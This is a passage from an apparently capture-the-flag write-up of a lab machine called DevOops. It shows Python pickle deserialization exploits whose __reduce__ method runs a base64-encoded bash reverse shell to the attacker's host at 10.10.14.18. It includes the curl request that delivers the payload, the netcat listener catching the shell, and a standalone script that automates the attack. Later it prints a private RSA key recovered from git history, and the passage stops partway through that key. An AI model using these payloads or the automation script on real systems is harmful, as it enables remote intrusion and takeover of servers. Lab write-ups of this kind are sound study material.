class="SemanticStringArray"><span class="SemanticString">The following Python script dumps a serialized string of the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">exploit</code></span><span class="SemanticString"> class, which has a </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">__reduce__</code></span><span class="SemanticString"> method that calls </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">os.system()</code></span><span class="SemanticString"> and runs a reverse shell payload.</span></span></p></div><pre id="https://www.notion.so/8790c51570c1434bb82c3825f6d8ad6c" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token keyword">import</span> pickle
+<span class="token keyword">import</span> base64
+<span class="token keyword">import</span> os
+
+<span class="token keyword">class</span> <span class="token class-name">exploit</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        cmd <span class="token operator">=</span> <span class="token string">"echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjE4LzgwMDEgMD4mMQ== | base64 -d | bash"</span>
+        <span class="token keyword">return</span> <span class="token punctuation">(</span>os<span class="token punctuation">.</span>system<span class="token punctuation">,</span> <span class="token punctuation">(</span>cmd<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>urlsafe_b64encode<span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>exploit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span></span></span></code></pre><div id="https://www.notion.so/495d8b161d924d9687596f31231004ed" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The reverse shell payload is generated from </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://www.revshells.com/">revshells.com</a></span><span class="SemanticString">, which is a handy tool for crafting payloads in different types and encodings. I prefer using base64 encoded payloads, as it almost always worked for me.</span></span></p></div><div id="https://www.notion.so/314895355f2344d4b3d3e1a66167dae4" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F3a7eeae4-a9ef-417a-a37f-981b9efb8e3f%2FUntitled.png?width=1180&amp;table=block&amp;id=31489535-5f23-44d4-b3d3-e1a66167dae4"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F3a7eeae4-a9ef-417a-a37f-981b9efb8e3f%2FUntitled.png?width=1180&amp;table=block&amp;id=31489535-5f23-44d4-b3d3-e1a66167dae4" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1ae5a894e50b47328891a0991a306f3b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">With the serialized data generated, I can send it to the server using </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">curl</code></span><span class="SemanticString"> again.</span></span></p></div><pre id="https://www.notion.so/b2fe7871c89d4dda936291b224c7acce" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/devoops]
+└─$</span></mark></span><span class="SemanticString"><span> python2 payload.py
+
+Y3Bvc2l4CnN5c3RlbQpwMAooUydlY2hvIEwySnBiaTlpWVhOb0lDMXBJRDRtSUM5a1pYWXZkR053THpFd0xqRXdMakUwTGpFNEx6Z3dNREVnTUQ0bU1RPT0gfCBiYXNlNjQgLWQgfCBiYXNoJwpwMQp0cDIKUnAzCi4=
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/devoops]
+└─$</span></mark></span><span class="SemanticString"><span> curl http://10.129.191.193:5000/newpost -X POST -H &#x27;Content-Type:&#x27; -d &#x27;Y3Bvc2l4CnN5c3RlbQpwMAooUydlY2hvIEwySnBiaTlpWVhOb0lDMXBJRDRtSUM5a1pYWXZkR053THpFd0xqRXdMakUwTGpFNEx6Z3dNREVnTUQ0bU1RPT0gfCBiYXNlNjQgLWQgfCBiYXNoJwpwMQp0cDIKUnAzCi4=&#x27;
+
+curl: (52) Empty reply from server</span></span></span></code></pre><div id="https://www.notion.so/007f7cdb6d44443c97bc02cb4a9a9247" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">curl</code></span><span class="SemanticString"> didn’t get a response, but a shell session is caught on the listener:</span></span></p></div><pre id="https://www.notion.so/70f634f381874ff9868a21f2b808834f" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/devoops]
+└─$</span></mark></span><span class="SemanticString"><span> sudo nc -lvnp 8001                                                                                                                                                          
+
+listening on [any] 8001 ...
+connect to [10.10.14.18] from (UNKNOWN) [10.129.191.193] 60398
+bash: cannot set terminal process group (1290): Inappropriate ioctl for device
+bash: no job control in this shell
+To run a command as administrator (user &quot;root&quot;), use &quot;sudo &lt;command&gt;&quot;.
+See &quot;man sudo_root&quot; for details.
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>roosa@devoops:~/deploy/src$</span></mark></span><span class="SemanticString"><span> id
+
+uid=1002(roosa) gid=1002(roosa) groups=1002(roosa),4(adm),27(sudo)</span></span></span></code></pre><div id="https://www.notion.so/188e2b29ad614b96ad3fc4a0f1a0ce8e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/509df3f29e17497f873c00a21d93e6b0" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">As a bonus, I’ve also created a Python script to automate the entire deserialization attack:</span></span></p></div><pre id="https://www.notion.so/2a78ffc963d94e6a8020a86d077439e8" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token keyword">import</span> pickle
+<span class="token keyword">import</span> base64
+<span class="token keyword">import</span> os
+<span class="token keyword">import</span> sys
+<span class="token keyword">import</span> requests
+<span class="token keyword">from</span> colorama <span class="token keyword">import</span> Fore<span class="token punctuation">,</span> Style
+
+<span class="token keyword">class</span> <span class="token class-name">exploit</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        self<span class="token punctuation">.</span>payload <span class="token operator">=</span> <span class="token string">'echo '</span> <span class="token operator">+</span> cmd <span class="token operator">+</span> <span class="token string">' | base64 -d | bash'</span>
+
+    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token punctuation">(</span>os<span class="token punctuation">.</span>system<span class="token punctuation">,</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>payload<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token comment"># print(base64.urlsafe_b64encode(pickle.dumps(exploit())).decode())</span>
+
+<span class="token keyword">def</span> <span class="token function">send_req</span><span class="token punctuation">(</span>server_ip<span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>Fore<span class="token punctuation">.</span>BLUE <span class="token operator">+</span> <span class="token string">"[*] Sending to server..."</span> <span class="token operator">+</span> Style<span class="token punctuation">.</span>RESET_ALL<span class="token punctuation">)</span>
+    url <span class="token operator">=</span> <span class="token string">'http://'</span> <span class="token operator">+</span> server_ip <span class="token operator">+</span> <span class="token string">':5000/newpost'</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">except</span> requests<span class="token punctuation">.</span>Timeout<span class="token punctuation">:</span>
+        <span class="token keyword">pass</span>
+    <span class="token keyword">except</span> requests<span class="token punctuation">.</span>RequestException <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>Fore<span class="token punctuation">.</span>RED <span class="token operator">+</span> <span class="token string">"[-] Something went wrong."</span> <span class="token operator">+</span> Style<span class="token punctuation">.</span>RESET_ALL<span class="token punctuation">)</span>
+    
+    <span class="token keyword">print</span><span class="token punctuation">(</span>Fore<span class="token punctuation">.</span>GREEN <span class="token operator">+</span> <span class="token string">"[+] Payload sent. Check your listener"</span> <span class="token operator">+</span> Style<span class="token punctuation">.</span>RESET_ALL<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">generate_payload</span><span class="token punctuation">(</span>lhost<span class="token punctuation">,</span> lport<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>Fore<span class="token punctuation">.</span>BLUE <span class="token operator">+</span> <span class="token string">"[*] Generating payload..."</span> <span class="token operator">+</span> Style<span class="token punctuation">.</span>RESET_ALL<span class="token punctuation">)</span>
+    cmd_raw <span class="token operator">=</span> <span class="token string">'/bin/bash -i >&amp; /dev/tcp/'</span> <span class="token operator">+</span> lhost <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>lport<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' 0>&amp;1'</span>
+    cmd_b64 <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>cmd_raw<span class="token punctuation">)</span>
+    pickle_payload <span class="token operator">=</span> base64<span class="token punctuation">.</span>urlsafe_b64encode<span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>exploit<span class="token punctuation">(</span>cmd_b64<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> pickle_payload
+
+<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">4</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>Fore<span class="token punctuation">.</span>RED <span class="token operator">+</span> <span class="token string">"[-] Usage: python pickle_rce.py &lt;SERVER_IP> &lt;LHOST> &lt;LPORT>"</span> <span class="token operator">+</span> Style<span class="token punctuation">.</span>RESET_ALL<span class="token punctuation">)</span>
+        exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+    
+    server_ip <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
+    lhost <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>
+    lport <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>
+
+    payload <span class="token operator">=</span> generate_payload<span class="token punctuation">(</span>lhost<span class="token punctuation">,</span> lport<span class="token punctuation">)</span>
+    send_req<span class="token punctuation">(</span>server_ip<span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+    main<span class="token punctuation">(</span><span class="token punctuation">)</span></span></span></span></code></pre><div id="https://www.notion.so/1b8d791d98134390b1cb939b9a55084e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/bd6401a207a04da7a02a2e6afda81025" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">User Flag:</strong></span></span></p></div><pre id="https://www.notion.so/fd3ab8f165c54ca4b98c9a4dc35cdd6b" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>roosa@devoops:~$</span></mark></span><span class="SemanticString"><span> cat user.txt
+
+845ff914************************</span></span></span></code></pre><div id="https://www.notion.so/0629d31447114226bbe856a2da1960ee" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/49d1f280c81b40afafc00d16e94d750c" class="Divider"></div><h3 id="https://www.notion.so/6fc7fad62031453c9a1ed59f88675a02" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/6fc7fad62031453c9a1ed59f88675a02"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Post-Exploitation as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">roosa</code></span><span class="SemanticString">:</span></span></h3><div id="https://www.notion.so/af0dfc620fc2450d9751829129878849" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Users and Groups:</strong></span></span></p></div><pre id="https://www.notion.so/b9781cc9185e444ba888fc90848f2c78" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>roosa@devoops:~$</span></mark></span><span class="SemanticString"><span> id
+
+uid=1002(roosa) gid=1002(roosa) groups=1002(roosa),4(adm),27(sudo)</span></span></span></code></pre><div id="https://www.notion.so/b4865cc844c14a9ab54d92269a49584a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">roosa</code></span><span class="SemanticString"> is in the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">sudo</code></span><span class="SemanticString"> group, but abusing this requires the password, which we have no knowledge of.</span></span></p></div><div id="https://www.notion.so/181ddac477b34d25b3eae2c9953fe318" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/431754b1be3e46309d32d2e7f1eee0a3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">LinPEAS Scan:</strong></span></span></p></div><div id="https://www.notion.so/8790dcb5b9864ec79e6690c024cc8c53" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The scan identified a few more private keys lying around:</span></span></p></div><div id="https://www.notion.so/1949642710dd45c8ba0eeb2471f64f4a" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F0cfceb34-1a0f-439e-b7dd-e76c8c529a17%2FUntitled.png?width=870&amp;table=block&amp;id=19496427-10dd-45c8-ba0e-eb2471f64f4a"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F0cfceb34-1a0f-439e-b7dd-e76c8c529a17%2FUntitled.png?width=870&amp;table=block&amp;id=19496427-10dd-45c8-ba0e-eb2471f64f4a" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/18d452968f4c4a81b30f1eb4d15a116f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The same </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">authcredentials.key</code></span><span class="SemanticString"> file can be found in two separate directories, but it’s different to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">roosa</code></span><span class="SemanticString">&#x27;s SSH key.</span></span></p></div><pre id="https://www.notion.so/8d960df38b3f424d8630784eb985244b" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>roosa@devoops:~$</span></mark></span><span class="SemanticString"><span> md5sum /home/roosa/deploy/resources/integration/authcredentials.key 
+
+f57f7e28835e631c37ad0d090ef3b6fd  /home/roosa/deploy/resources/integration/authcredentials.key
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>roosa@devoops:~$</span></mark></span><span class="SemanticString"><span> md5sum /home/roosa/work/blogfeed/resources/integration/authcredentials.key 
+
+f57f7e28835e631c37ad0d090ef3b6fd  /home/roosa/work/blogfeed/resources/integration/authcredentials.key
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>roosa@devoops:~$</span></mark></span><span class="SemanticString"><span> md5sum ~/.ssh/id_rsa
+
+772356d07d65c2b1c7a497d066deb290  /home/roosa/.ssh/id_rsa</span></span></span></code></pre><div id="https://www.notion.so/46ee654403104fa3a5e8c3c94c41bd8e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I tried to SSH as root using </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">authcredentials.key</code></span><span class="SemanticString">, but it failed.</span></span></p></div><div id="https://www.notion.so/9ca217d88fff4d108efb62b534bc5855" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/c9021ac856994f21adabfb892cab80ed" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">~/work/blogfeed/</strong></code></span><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold"> and </strong></span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">~/deploy/</strong></code></span><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">:</strong></span></span></p></div><div id="https://www.notion.so/da1607661d334edea0b2a164c516b7b5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Both directories look almost identical as well, but only </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">~/work/blogfeed/</code></span><span class="SemanticString"> is under git control:</span></span></p></div><pre id="https://www.notion.so/30e6262ff7fc47a1a435cada7d7c6e0f" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>roosa@devoops:~$</span></mark></span><span class="SemanticString"><span> ls -la ~/work/blogfeed/
+
+total 28
+drwxrwx--- 5 roosa roosa 4096 Mar 26  2021 .
+drwxrwxr-x 3 roosa roosa 4096 Mar 26  2021 ..
+drwxrwx--- 8 roosa roosa 4096 Mar 26  2021 .git
+-rw-rw---- 1 roosa roosa  104 Mar 19  2018 README.md
+drwxrwx--- 3 roosa roosa 4096 Mar 26  2021 resources
+-rwxrw-r-- 1 roosa roosa  180 Mar 21  2018 run-gunicorn.sh
+drwxrwx--- 2 roosa roosa 4096 Mar 26  2021 src
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>roosa@devoops:~$</span></mark></span><span class="SemanticString"><span> ls -la ~/deploy
+
+total 24
+drwxrwxr-x  4 roosa roosa 4096 Mar 26  2021 .
+drwxr-xr-x 22 roosa roosa 4096 Feb 12 04:33 ..
+-rw-rw----  1 roosa roosa  104 Mar 26  2018 README.md
+drwxrwx---  3 roosa roosa 4096 Mar 26  2021 resources
+-r-xr--r--  1 roosa roosa  180 Mar 26  2018 run-gunicorn.sh
+drwxrwx---  2 roosa roosa 4096 Feb 12 00:40 src</span></span></span></code></pre><div id="https://www.notion.so/c97aca158fa24722880d512dca8370e5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/163011f7edc94e3a9080e5c263da1f73" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Git History:</strong></span></span></p></div><div id="https://www.notion.so/d03db791daea4ae9ac5d04df837312f1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">With </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">git</code></span><span class="SemanticString">, I can check the commit history in the repository.</span></span></p></div><pre id="https://www.notion.so/fe7b2745b54d414f8bd4c1e8b803eb4e" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>roosa@devoops:~/work/blogfeed$</span></mark></span><span class="SemanticString"><span> git log
+
+commit 7ff507d029021b0915235ff91e6a74ba33009c6d
+Author: Roosa Hakkerson &lt;roosa@solita.fi&gt;
+Date:   Mon Mar 26 06:13:55 2018 -0400
+
+    Use Base64 for pickle feed loading
+
+commit 26ae6c8668995b2f09bf9e2809c36b156207bfa8
+Author: Roosa Hakkerson &lt;roosa@solita.fi&gt;
+Date:   Tue Mar 20 15:37:00 2018 -0400
+
+    Set PIN to make debugging faster as it will no longer change every time the application code is changed. Remember to remove before production use.
+
+commit cec54d8cb6117fd7f164db142f0348a74d3e9a70
+Author: Roosa Hakkerson &lt;roosa@solita.fi&gt;
+Date:   Tue Mar 20 15:08:09 2018 -0400
+
+    Debug support added to make development more agile.
+
+commit ca3e768f2434511e75bd5137593895bd38e1b1c2
+Author: Roosa Hakkerson &lt;roosa@solita.fi&gt;
+Date:   Tue Mar 20 08:38:21 2018 -0400
+
+    Blogfeed app, initial version.
+
+commit dfebfdfd9146c98432d19e3f7d83cc5f3adbfe94
+Author: Roosa Hakkerson &lt;roosa@solita.fi&gt;
+Date:   Tue Mar 20 08:37:56 2018 -0400
+
+    Gunicorn startup script
+
+commit 33e87c312c08735a02fa9c796021a4a3023129ad
+Author: Roosa Hakkerson &lt;roosa@solita.fi&gt;
+Date:   Mon Mar 19 09:33:06 2018 -0400
+
+    reverted accidental commit with proper key
+
+commit d387abf63e05c9628a59195cec9311751bdb283f
+Author: Roosa Hakkerson &lt;roosa@solita.fi&gt;
+Date:   Mon Mar 19 09:32:03 2018 -0400
+
+    add key for feed integration from tnerprise backend
+
+commit 1422e5a04d1b52a44e6dc81023420347e257ee5f
+Author: Roosa Hakkerson &lt;roosa@solita.fi&gt;
+Date:   Mon Mar 19 09:24:30 2018 -0400
+
+    Initial commit</span></span></span></code></pre><div id="https://www.notion.so/b6046c52e8854850a8327a0908f89c4a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">One of the entries, “reverted accidental commit with proper key”, looks extremely interesting. The developer may have committed a real private key in by accident. I can use </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">git show</code></span><span class="SemanticString"> to see the exact change this commit made:</span></span></p></div><pre id="https://www.notion.so/5532a63c41624fefaa89562fdd97cb0c" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>roosa@devoops:~/work/blogfeed$</span></mark></span><span class="SemanticString"><span> git show 33e87c312c08735a02fa9c796021a4a3023129ad
+
+commit 33e87c312c08735a02fa9c796021a4a3023129ad
+Author: Roosa Hakkerson &lt;roosa@solita.fi&gt;
+Date:   Mon Mar 19 09:33:06 2018 -0400
+
+    reverted accidental commit with proper key
+
+diff --git a/resources/integration/authcredentials.key b/resources/integration/authcredentials.key
+index 44c981f..f4bde49 100644
+--- a/resources/integration/authcredentials.key
++++ b/resources/integration/authcredentials.key
+@@ -1,28 +1,27 @@
+ -----BEGIN RSA PRIVATE KEY-----
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorGreen"><span>-MIIEogIBAAKCAQEArDvzJ0k7T856dw2pnIrStl0GwoU/WFI+OPQcpOVj9DdSIEde
+-8PDgpt/tBpY7a/xt3sP5rD7JEuvnpWRLteqKZ8hlCvt+4oP7DqWXoo/hfaUUyU5i
+-vr+5Ui0nD+YBKyYuiN+4CB8jSQvwOG+LlA3IGAzVf56J0WP9FILH/NwYW2iovTRK
+-nz1y2vdO3ug94XX8y0bbMR9Mtpj292wNrxmUSQ5glioqrSrwFfevWt/rEgIVmrb+
+-CCjeERnxMwaZNFP0SYoiC5HweyXD6ZLgFO4uOVuImILGJyyQJ8u5BI2mc/SHSE0c
+-F9DmYwbVqRcurk3yAS+jEbXgObupXkDHgIoMCwIDAQABAoIBAFaUuHIKVT+UK2oH
+-uzjPbIdyEkDc3PAYP+E/jdqy2eFdofJKDocOf9BDhxKlmO968PxoBe25jjjt0AAL
+-gCfN5I+xZGH19V4HPMCrK6PzskYII3/i4K7FEHMn8ZgDZpj7U69Iz2l9xa4lyzeD
+-k2X0256DbRv/ZYaWPhX+fGw3dCMWkRs6MoBNVS4wAMmOCiFl3hzHlgIemLMm6QSy
+-NnTtLPXwkS84KMfZGbnolAiZbHAqhe5cRfV2CVw2U8GaIS3fqV3ioD0qqQjIIPNM
+-HSRik2J/7Y7OuBRQN+auzFKV7QeLFeROJsLhLaPhstY5QQReQr9oIuTAs9c+oCLa
+-2fXe3kkCgYEA367aoOTisun9UJ7ObgNZTDPeaXajhWrZbxlSsOeOBp5CK/oLc0RB
+-GLEKU6HtUuKFvlXdJ22S4/rQb0RiDcU/wOiDzmlCTQJrnLgqzBwNXp+MH6Av9WHG
+-jwrjv/loHYF0vXUHHRVJmcXzsftZk2aJ29TXud5UMqHovyieb3mZ0pcCgYEAxR41
+-IMq2dif3laGnQuYrjQVNFfvwDt1JD1mKNG8OppwTgcPbFO+R3+MqL7lvAhHjWKMw
+-+XjmkQEZbnmwf1fKuIHW9uD9KxxHqgucNv9ySuMtVPp/QYtjn/ltojR16JNTKqiW
+-7vSqlsZnT9jR2syvuhhVz4Ei9yA/VYZG2uiCpK0CgYA/UOhz+LYu/MsGoh0+yNXj
+-Gx+O7NU2s9sedqWQi8sJFo0Wk63gD+b5TUvmBoT+HD7NdNKoEX0t6VZM2KeEzFvS
+-iD6fE+5/i/rYHs2Gfz5NlY39ecN5ixbAcM2tDrUo/PcFlfXQhrERxRXJQKPHdJP7
+-VRFHfKaKuof+bEoEtgATuwKBgC3Ce3bnWEBJuvIjmt6u7EFKj8CgwfPRbxp/INRX
